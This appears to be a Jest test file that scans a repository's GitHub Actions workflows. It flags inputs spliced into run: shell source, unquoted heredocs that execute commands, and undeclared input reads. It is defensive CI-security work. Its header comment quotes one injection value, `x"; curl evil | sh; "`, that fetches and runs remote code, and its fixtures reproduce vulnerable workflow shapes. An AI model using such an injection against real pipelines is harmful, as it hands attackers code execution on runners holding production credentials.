/**
 * Platform-wide invariant — Plan 024 v3 §B-3, widened by INFRA-CRITICAL-080:
 *
 * No `.github/workflows/*.yml` may splice a workflow input —
 * `${{ inputs.<X> }}` or `${{ github.event.inputs.<X> }}`, alone or inside a
 * larger expression such as `${{ inputs.a || github.event.inputs.a || '' }}` —
 * into the source text of a `run:` step. The runner substitutes the expression
 * BEFORE bash parses the script, so the value becomes code: a dispatch reason of
 * `x"; curl evil | sh; "` closes the assignment it was meant to fill and runs.
 * Inputs are operator-controlled (workflow_dispatch) or caller-controlled
 * (workflow_call), never trusted source. The fix lives in three patterns:
 *
 *   1. Pass the input via an `env:` block on the step (or job).
 *   2. Inside the `run:` script, refer to the env var as `"$VAR"`
 *      with quoting + bash regex validation.
 *   3. For inter-job data flow, use `outputs:` + `$GITHUB_OUTPUT`
 *      + `needs.<job>.outputs.*` — env does not cross job
 *      boundaries.
 *
 * # Scope — every workflow, not only aria-*
 *
 * The first version of this gate scanned only `aria-*.yml` and recorded the
 * production deploy/release pipelines as orphan findings. The production deploy
 * lane then kept `BYPASS="${{ inputs.bypass_staging_gate || ... }}"`,
 * `REASON="${{ inputs.bypass_reason || ... }}"` and
 * `REQUESTED_SERVICES="${{ inputs.services || ... }}"` in shell source — the
 * operator-typed bypass reason was a direct runner-code path
 * (INFRA-CRITICAL-080). A rule that holds for one prefix and not for the
 * workflows holding production credentials enforces it where it matters least.
 *
 * # Why the scan parses YAML instead of tracking lines
 *
 * The previous line scanner had two blind spots, both present on main when it
 * was replaced:
 *
 *   - it recognised a step only when the trimmed line started with `run:`, so
 *     the common `- run: |` spelling was never entered;
 *   - its pattern required `}}` straight after the input name, so a fallback
 *     chain (`${{ inputs.x || github.event.inputs.x || 'all' }}`) never matched.
 *
 * Parsing the workflow and reading each step's `run` value removes the first
 * class entirely; matching any expression whose BODY reads the inputs context
 * removes the second. `env:` and `with:` values are untouched by design: an env
 * value reaches the script as data, and an action validates its own inputs.
 */

import { readFileSync, readdirSync, rmSync, writeFileSync } from 'node:fs';
import { resolve, join } from 'node:path';

import yaml from 'js-yaml';

const REPO_ROOT = resolve(__dirname, '..', '..');
const WORKFLOWS_DIR = join(REPO_ROOT, '.github', 'workflows');

/**
 * Only text inside `${{ ... }}` is substituted by the runner, so that is the
 * only place an injection can come from. Prose in a shell comment that NAMES
 * `inputs.x` without the expression braces is inert and is not reported.
 */
const EXPRESSION_BLOCK_RE = /\$\{\{([\s\S]*?)\}\}/g;

/**
 * The inputs context in an expression body: `inputs` or `github.event.inputs`.
 * The look-behind keeps a longer identifier (`my_inputs.x`, `steps.inputs.x`)
 * from matching; the `github.event.inputs` alternative is listed explicitly
 * because its `inputs` is preceded by `.`. Both rules below build on this one
 * source, so they cannot disagree about what an inputs read is.
 */
const INPUTS_CONTEXT_SOURCE = String.raw`(?<![A-Za-z0-9_.])(?:github\.event\.inputs|inputs)\s*`;

/** A read of the inputs context: `inputs.x`, `inputs['x']`, `github.event.inputs.x`. */
const INPUTS_CONTEXT_RE = new RegExp(`${INPUTS_CONTEXT_SOURCE}(?:\\.|\\[)`);

/**
 * The same read with the input's name captured: group 1 for the dotted form,
 * group 2 for the index form with a quoted literal. A computed index
 * (`inputs[format(...)]`) names no input and is not matched.
 */
const NAMED_INPUT_READ_RE = new RegExp(
  `${INPUTS_CONTEXT_SOURCE}(?:\\.\\s*([A-Za-z_][A-Za-z0-9_-]*)|\\[\\s*['"]([^'"]+)['"]\\s*\\])`,
  'g',
);

interface Violation {
  readonly file: string;
  readonly lineNo: number;
  readonly line: string;
  readonly snippet: string;
}

type WorkflowStep = Record<string, unknown> & { run?: unknown };
type WorkflowJob = Record<string, unknown> & { steps?: unknown };
type WorkflowDocument = { jobs?: Record<string, WorkflowJob> } | null;

function workflowFiles(filter: (name: string) => boolean = () => true): string[] {
  return readdirSync(WORKFLOWS_DIR)
    .filter((f) => f.endsWith('.yml') || f.endsWith('.yaml'))
    .filter(filter)
    .sort();
}

/**
 * Every input-reading expression in the `run:` source of every step of every
 * job. The YAML text is passed in (not a path) so the fixture test below can
 * pin the scanner against the exact shapes that shipped.
 */
function findRunBlockViolationsInText(text: string, label: string): Violation[] {
  const document = yaml.load(text) as WorkflowDocument;
  const lines = text.split('\n');
  const violations: Violation[] = [];

  // js-yaml keeps mapping order, so jobs and steps are visited in file order
  // and a forward-only cursor maps each run block back to its source lines
  // (for the file:line in the report; the verdict never depends on it).
  let cursor = 0;
  for (const job of Object.values(document?.jobs ?? {})) {
    const steps = Array.isArray(job?.steps) ? (job.steps as WorkflowStep[]) : [];
    for (const step of steps) {
      if (typeof step?.run !== 'string') continue;
      const runLines = step.run.split('\n');
      const firstContent = runLines.findIndex((line) => line.trim() !== '');
      const anchor = runLines[firstContent]?.trim() ?? '';
      const anchorLine = lines.findIndex((line, index) => index >= cursor && line.includes(anchor));
      const runStartLine = anchorLine >= 0 ? anchorLine - firstContent : -1;
      if (anchorLine >= 0) cursor = anchorLine + (runLines.length - firstContent);

      for (const match of step.run.matchAll(EXPRESSION_BLOCK_RE)) {
        const body = match[1];
        if (body === undefined || !INPUTS_CONTEXT_RE.test(body)) continue;
        const offsetInRun = step.run.slice(0, match.index).split('\n').length - 1;
        const lineIndex = runStartLine >= 0 ? runStartLine + offsetInRun : -1;
        violations.push({
          file: label,
          lineNo: lineIndex + 1,
          line: lines[lineIndex] ?? runLines[offsetInRun] ?? '',
          snippet: match[0],
        });
      }
    }
  }
  return violations;
}

function findRunBlockViolations(yamlPath: string): Violation[] {
  return findRunBlockViolationsInText(readFileSync(yamlPath, 'utf-8'), yamlPath);
}

// The unquoted-heredoc rule below stays scoped to ARIA-owned workflows: it was
// introduced for aria-daily-report.yml and has not been audited repo-wide.
const ARIA_WORKFLOW_PREFIX = 'aria-';

/**
 * Second class, same surface: an UNQUOTED heredoc whose body performs command
 * substitution.
 *
 * `cat > "$BODY_FILE" <<EOF` leaves the body under shell parsing, so backticks
 * and `$(...)` inside it are EXECUTED, not written. aria-daily-report.yml built
 * its PR body that way, and markdown code spans are written with backticks —
 * the shell ran `${REPORT}` and `.github/workflows/aria-daily-report.yml` as
 * commands on every scheduled run. It read as cosmetic "Permission denied"
 * noise in the log; it was a command-substitution surface on the one path in
 * the workflow that assembles text from variables.
 *
 * A quoted delimiter (`<<'EOF'`) makes the body literal. Bodies that only
 * expand `${VAR}` are left alone: parameter expansion is the reason to leave a
 * heredoc unquoted, and flagging it would train authors to quote and then
 * silently ship an unexpanded `${VAR}` in their output.
 */
const COMMAND_SUBSTITUTION_RE = /`|\$\(/;

function findHeredocViolations(yamlPath: string): Violation[] {
  const lines = readFileSync(yamlPath, 'utf-8').split('\n');
  const violations: Violation[] = [];

  let openDelimiter: string | null = null;
  let openLineNo = 0;
  let openLine = '';
  let body: string[] = [];

  for (const [index, line] of lines.entries()) {
    if (openDelimiter !== null) {
      if (line.trim() === openDelimiter) {
        const joined = body.join('\n');
        if (COMMAND_SUBSTITUTION_RE.test(joined)) {
          violations.push({
            file: yamlPath,
            lineNo: openLineNo,
            line: openLine,
            snippet: `<<${openDelimiter} body performs command substitution`,
          });
        }
        openDelimiter = null;
        body = [];
      } else {
        body.push(line);
      }
      continue;
    }

    // An unquoted delimiter: `<<EOF` / `<<-EOF`, but not `<<'EOF'` or `<<"EOF"`.
    const opener = line.match(/<<-?\s*([A-Za-z_][A-Za-z0-9_]*)\s*$/);
    if (opener?.[1]) {
      openDelimiter = opener[1];
      openLineNo = index + 1;
      openLine = line;
      body = [];
    }
  }
  return violations;
}

describe('workflow input injection invariant (Plan 024 v3 §B-3, INFRA-CRITICAL-080)', () => {
  test('no workflow interpolates an input (${{ inputs.* }} or ${{ github.event.inputs.* }}) inside run: source', () => {
    const files = workflowFiles();
    // The deploy lane is the reason the scope is repo-wide; losing it from the
    // scan (a rename, a filter regression) must fail loudly, not pass quietly.
    expect(files).toEqual(
      expect.arrayContaining(['deploy-digitalocean.yml', 'deploy-development.yml']),
    );

    const allViolations: Violation[] = [];
    for (const file of files) {
      const yamlPath = join(WORKFLOWS_DIR, file);
      allViolations.push(...findRunBlockViolations(yamlPath));
    }

    if (allViolations.length > 0) {
      const summary = allViolations
        .map(
          (v) =>
            `  ${v.file.replace(REPO_ROOT + '/', '')}:${v.lineNo}\n` +
            `    ${v.line.trim()}\n` +
            `    => match: ${v.snippet}`,
        )
        .join('\n');
      throw new Error(
        `Plan 024 v3 §B-3 / INFRA-CRITICAL-080 violation — workflow input ` +
          `interpolated into run: shell source:\n${summary}\n\n` +
          `Fix: move the input to an env: block on the step (or job), ` +
          `then reference it as "$VAR" inside run: with a regex validate ` +
          `before any shell use. For inter-job data flow, use outputs: + ` +
          `$GITHUB_OUTPUT + needs.<job>.outputs.*. See the canonical ` +
          `pattern in .github/workflows/aria-daily-report.yml after Plan ` +
          `024 §B-3.`,
      );
    }
  });

  test('the run: scanner fires on every shape that shipped, and spares the env channel', () => {
    // A gate nobody has seen fail is a gate nobody knows the direction of. Each
    // fixture is a shape that was live on main when this scan was widened.
    const job = (steps: string[]): string =>
      ['jobs:', '  x:', '    runs-on: ubuntu-latest', '    steps:', ...steps, ''].join('\n');

    // deploy-digitalocean.yml staging-gate: fallback chain in a `run: |` step.
    const fallbackChain = job([
      '      - name: Check bypass',
      '        run: |',
      '          REASON="${{ inputs.bypass_reason || github.event.inputs.bypass_reason || \'\' }}"',
    ]);
    expect(findRunBlockViolationsInText(fallbackChain, 'fixture')).toHaveLength(1);

    // The `- run: |` spelling the line scanner never entered.
    const dashRun = job(['      - run: |', '          echo "${{ inputs.head_sha }}"']);
    expect(findRunBlockViolationsInText(dashRun, 'fixture')).toHaveLength(1);

    // Single-line run and the legacy github.event.inputs spelling.
    const inline = job(['      - run: echo "value=${{ github.event.inputs.tag }}"']);
    expect(findRunBlockViolationsInText(inline, 'fixture')).toHaveLength(1);

    // The repaired shape: the value crosses as env data, the script reads "$VAR".
    const envChannel = job([
      '      - name: Check bypass',
      '        env:',
      "          REASON: ${{ inputs.bypass_reason || github.event.inputs.bypass_reason || '' }}",
      '        run: |',
      '          printf \'%s\\n\' "${REASON}"',
    ]);
    expect(findRunBlockViolationsInText(envChannel, 'fixture')).toHaveLength(0);

    // Other contexts and inert prose are not this rule's subject.
    const otherContexts = job([
      '      - run: |',
      '          # inputs.head_sha is passed through env below',
      '          echo "${{ github.sha }} ${{ steps.scope.outputs.reason }}"',
    ]);
    expect(findRunBlockViolationsInText(otherContexts, 'fixture')).toHaveLength(0);
  });

  test('no aria-* workflow opens an unquoted heredoc whose body runs commands', () => {
    const ariaWorkflowFiles = workflowFiles((f) => f.startsWith(ARIA_WORKFLOW_PREFIX));
    expect(ariaWorkflowFiles.length).toBeGreaterThan(0);

    const allViolations: Violation[] = [];
    for (const file of ariaWorkflowFiles) {
      allViolations.push(...findHeredocViolations(join(WORKFLOWS_DIR, file)));
    }

    if (allViolations.length > 0) {
      const summary = allViolations
        .map(
          (v) =>
            `  ${v.file.replace(REPO_ROOT + '/', '')}:${v.lineNo}\n` +
            `    ${v.line.trim()}\n` +
            `    => ${v.snippet}`,
        )
        .join('\n');
      throw new Error(
        `Unquoted heredoc with command substitution in its body:\n${summary}\n\n` +
          `Fix: quote the delimiter (<<'EOF') so the body is literal, and if ` +
          `the body needs values, render it with python3 reading os.environ ` +
          `instead of letting the shell interpolate. See the canonical ` +
          `pattern in .github/workflows/aria-daily-report.yml.`,
      );
    }
  });

  test('the heredoc scanner fires on the shape that shipped, and spares plain expansion', () => {
    // A gate nobody has seen fail is a gate nobody knows the direction of.
    // These pin both directions against the real before/after text.
    const tmp = join(REPO_ROOT, 'tmp-heredoc-fixture.yml');
    const write = (body: string): Violation[] => {
      writeFileSync(tmp, body, 'utf-8');
      try {
        return findHeredocViolations(tmp);
      } finally {
        rmSync(tmp, { force: true });
      }
    };

    const shipped = [
      'jobs:',
      '  x:',
      '    steps:',
      '      - run: |',
      '          cat > "$BODY_FILE" <<EOF',
      '          Generated report: `${REPORT}`.',
      '          EOF',
      '',
    ].join('\n');
    expect(write(shipped)).toHaveLength(1);

    const expansionOnly = shipped.replace('`${REPORT}`', '${REPORT}');
    expect(write(expansionOnly)).toHaveLength(0);

    const quoted = shipped.replace('<<EOF', "<<'EOF'");
    expect(write(quoted)).toHaveLength(0);
  });
});

/**
 * ARIA-LOW-510: an inputs read must name an input the workflow declares.
 *
 * aria-kernel.yml compacted with `${{ github.event.inputs.retain_days || '7' }}`
 * while its `workflow_dispatch` declared no inputs: the knob did not exist (the
 * expression always gave '7') and GitHub refuses a dispatch that passes an
 * undeclared input. Nothing compared the reads with the declarations.
 *
 * Declared inputs are the keys of `on.workflow_dispatch.inputs` and
 * `on.workflow_call.inputs`. Reads are taken from the parsed document, so YAML
 * comments never count: every `${{ ... }}` in any string value, plus every
 * `if:` value, which GitHub evaluates as an expression with or without braces.
 */
interface UndeclaredInputRead {
  readonly file: string;
  readonly at: string;
  readonly input: string;
}

function declaredWorkflowInputs(document: unknown): Set<string> {
  const declared = new Set<string>();
  if (typeof document !== 'object' || document === null) return declared;
  const on = (document as Record<string, unknown>).on;
  if (typeof on !== 'object' || on === null || Array.isArray(on)) return declared;
  for (const trigger of ['workflow_dispatch', 'workflow_call']) {
    const config = (on as Record<string, unknown>)[trigger];
    if (typeof config !== 'object' || config === null) continue;
    const inputs = (config as Record<string, unknown>).inputs;
    if (typeof inputs !== 'object' || inputs === null) continue;
    for (const name of Object.keys(inputs)) declared.add(name);
  }
  return declared;
}

function namedInputReads(expressionBody: string): string[] {
  const names: string[] = [];
  for (const read of expressionBody.matchAll(NAMED_INPUT_READ_RE)) {
    const name = read[1] ?? read[2];
    if (name !== undefined) names.push(name);
  }
  return names;
}

function findUndeclaredInputReadsInText(text: string, label: string): UndeclaredInputRead[] {
  const document: unknown = yaml.load(text);
  const declared = declaredWorkflowInputs(document);
  const reads: UndeclaredInputRead[] = [];

  const visit = (node: unknown, path: string, key: string | undefined): void => {
    if (typeof node === 'string') {
      const bodies = [...node.matchAll(EXPRESSION_BLOCK_RE)].map((match) => match[1] ?? '');
      if (key === 'if' && !node.includes('${{')) bodies.push(node);
      for (const body of bodies) {
        for (const input of namedInputReads(body)) {
          if (!declared.has(input)) reads.push({ file: label, at: path, input });
        }
      }
      return;
    }
    if (Array.isArray(node)) {
      node.forEach((item, index) => visit(item, `${path}[${index}]`, undefined));
      return;
    }
    if (typeof node === 'object' && node !== null) {
      for (const [childKey, child] of Object.entries(node)) {
        visit(child, path === '' ? childKey : `${path}.${childKey}`, childKey);
      }
    }
  };
  visit(document, '', undefined);
  return reads;
}

describe('workflow input declarations (ARIA-LOW-510)', () => {
  test('every inputs read in a workflow names an input its workflow_dispatch or workflow_call declares', () => {
    const files = workflowFiles();
    expect(files).toEqual(
      expect.arrayContaining(['aria-kernel.yml', 'aria-state-maintenance.yml']),
    );

    const undeclared: UndeclaredInputRead[] = [];
    for (const file of files) {
      undeclared.push(
        ...findUndeclaredInputReadsInText(readFileSync(join(WORKFLOWS_DIR, file), 'utf-8'), file),
      );
    }

    expect(undeclared.map((read) => `${read.file}: inputs.${read.input} at ${read.at}`)).toEqual(
      [],
    );
  });

  test('the declaration scanner fires on every read shape, and spares declared inputs and comments', () => {
    // A gate nobody has seen fail is a gate nobody knows the direction of.
    const workflow = (on: string[], steps: string[]): string =>
      [
        'on:',
        ...on,
        'jobs:',
        '  x:',
        '    runs-on: ubuntu-latest',
        '    steps:',
        ...steps,
        '',
      ].join('\n');
    const names = (text: string): string[] =>
      findUndeclaredInputReadsInText(text, 'fixture').map((read) => read.input);

    // The shape that shipped in aria-kernel.yml: env read, dispatch without inputs.
    const shipped = workflow(
      ['  workflow_dispatch:', '  pull_request:'],
      [
        '      - name: Compact',
        '        env:',
        "          RETAIN_DAYS: ${{ github.event.inputs.retain_days || '7' }}",
        '        run: echo "$RETAIN_DAYS"',
      ],
    );
    expect(names(shipped)).toEqual(['retain_days']);

    // Declaring it under workflow_dispatch (or workflow_call) answers the read.
    const declaredDispatch = shipped.replace(
      '  workflow_dispatch:\n',
      "  workflow_dispatch:\n    inputs:\n      retain_days:\n        default: '7'\n",
    );
    expect(names(declaredDispatch)).toEqual([]);
    const declaredCall = shipped.replace(
      '  workflow_dispatch:\n',
      '  workflow_call:\n    inputs:\n      retain_days:\n        type: string\n',
    );
    expect(names(declaredCall)).toEqual([]);

    // Index form, the bare-expression `if:` and a `with:` value are reads too.
    const otherShapes = workflow(
      ['  workflow_dispatch:'],
      [
        "      - if: inputs.dry_run == 'true'",
        '        uses: ./.github/actions/x',
        '        with:',
        "          sha: ${{ inputs['head_sha'] }}",
      ],
    );
    expect(names(otherShapes).sort()).toEqual(['dry_run', 'head_sha']);

    // A YAML comment naming an input, and other contexts, are not reads.
    const inert = workflow(
      ['  workflow_dispatch:', '  # ${{ inputs.retain_days }} is not declared here'],
      ['      - run: echo "${{ steps.scope.outputs.reason }} ${{ github.sha }}"'],
    );
    expect(names(inert)).toEqual([]);
  });
});
